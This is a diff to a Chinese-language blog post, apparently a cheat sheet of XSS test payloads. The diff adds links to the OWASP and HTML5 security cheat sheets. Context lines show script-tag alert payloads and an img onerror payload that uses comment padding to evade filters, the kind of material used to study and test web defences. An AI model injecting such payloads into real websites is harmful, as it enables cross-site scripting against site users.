@@ -7,6 +7,13 @@ date: 2016-01-20 21:38
 
 xss cheat sheet 即测试xss的测试样表
 
+[XSS_Filter_Evasion_Cheat_Sheet][2]
+
+[XSS Filter Evasion Cheat Sheet 中文版][3]
+
+[HTML5 Security Cheatsheet][1]
+
+
 ```
 <script>alert(1);</script>
 <script>alert('xss');</script>
@@ -175,3 +182,7 @@ xss另一个载体是CSS样式表，使用CSS样式表执行js具有隐蔽，灵
 # /**/
 <img/**/src="a"/**/onerror=alert(/xss/)>
 ```
+
+[1]: http://html5sec.org/
+[2]: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+[3]: http://drops.wooyun.org/tips/1955
